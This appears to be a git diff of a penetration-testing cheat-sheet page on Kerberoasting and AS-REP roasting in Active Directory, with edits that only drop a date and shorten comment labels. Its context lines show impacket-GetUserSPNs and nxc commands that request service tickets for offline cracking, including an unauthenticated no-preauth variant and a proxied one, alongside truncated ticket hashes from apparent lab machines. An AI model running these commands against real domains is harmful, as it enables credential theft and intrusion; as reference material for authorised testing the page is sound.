@@ -1,6 +1,5 @@
 ---
 title: "Kerberoasting"
-date: 2025-7-25
 tags: ["Kerberos", "Impacket", "Kerberoasting", "Asreproast", "Rubeus", "Domain Controller", "Active Directory", "Windows", "GetNPUsers"]
 ---
 
@@ -65,12 +64,12 @@ LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUT
 {{< tabcontent set2 tab1 >}}
 
 ```console
-# With Password
+# Password
 sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
 ```console
-# With Kerberos
+# Kerberos
 sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -no-pass -k -dc-host <DC>
 ```
 
@@ -92,7 +91,7 @@ $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$b62984d5b ---[SNIP]--- f4c2161
 <small>*Note: Times skew have to be within 5 minutes in kerberos*</small>
 
 ```console
-# Kerberoasting without cred
+# Anonymous
 sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS> -dc-host <DC> <DOMAIN>/
 ```
 
@@ -124,7 +123,7 @@ LDAPS       10.10.11.168    636    DC1.scrm.local   $krb5tgs$23$*sqlsvc$SCRM.LOC
 ```
 
 ```console
-# With socks5 proxy
+# Socks5
 proxychains4 -q nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --kerberoasting kerberoast_hashes.txt --dns-tcp --dns-server <DC_IP>
 ```
 
